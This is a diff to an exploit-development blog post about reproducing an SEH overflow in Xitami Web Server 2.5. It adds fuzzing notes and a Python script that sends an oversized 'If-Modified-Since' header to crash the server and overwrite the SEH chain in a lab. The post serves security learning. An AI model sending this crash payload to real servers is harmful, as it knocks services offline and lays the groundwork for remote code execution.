@@ -34,7 +34,7 @@ This particular post is about recreating an SEH Overwrite from an ExploitDB entr
 
 ## Finding a Candidate Exploit
 
-Searching ExploitDB for 'SEH' and one of the first entries is the [Xitami Web Server 2.5 SEH Overflow](https://www.exploit-db.com/exploits/46797). By glancing at the exploit it looks like it utilizes an egghunter and also stores the final shellcode separately from the payload that crashes the application. This should be a great exercise for us to troubleshoot our way through. You can download the application from [here](https://imatix-legacy.github.io/xitami.com/).
+Searching ExploitDB for 'SEH' and one of the first entries is the [Xitami Web Server 2.5 SEH Overflow](https://www.exploit-db.com/exploits/46797). By glancing at the exploit it looks like it utilizes an egghunter and also stores the final shellcode separately from the payload that crashes the application. It also uses a partial overwrite for the Next SEH handler pointer. This should be a great exercise for us to troubleshoot our way through. You can download the application from [here](https://imatix-legacy.github.io/xitami.com/).
 
 ## Fuzzing
 
@@ -143,6 +143,39 @@ s_string("15 Jun 2019 01:36:09 GMT", name="If-Modified-Since-Value")
 Sending this to our webserver nets us our crash!
 
 ![](/assets/images/CTP/xitamiSad.JPG)
+
+So, lesson learned on that one. Fuzzing is not always just about smashing applications with data, we should be intelligently fuzzing applications. Looking at the [Mozilla.org Documentation for 'If-Modified-Since'](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/If-Modified-Since), it looks like the overflow occurs on the '<day>' value, possibly due to some conversion process on the server side. (Huge thanks to firzen and v0idptr for their insights on this!)
+	
+So now that we have our crash, let's replicate it:
+```python
+import socket
+import sys
+
+host = "192.168.1.201"
+port = 80
+
+crash = "A" * 1000
+
+req = "GET / HTTP/1.1\r\n"
+req += "Host: 192.168.1.201\r\n"
+req += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
+req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+req += "Accept-Language: en-US,en;q=0.5\r\n"
+req += "Accept-Encoding: gzip, deflate\r\n"
+req += "Connection: close\r\n"
+req += "Upgrade-Insecure-Requests: 1\r\n"
+req += "If-Modified-Since: Wed, " + crash + "\r\n\r\n"
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host, port))
+s.send(req)
+s.close()
+```
+
+This also nets us our crash and we can see that we have overwritten both 4 byte components of the SEH chain. 
+
+![](/assets/images/CTP/SEHxitami.JPG)
+
 
 ## Resources
 
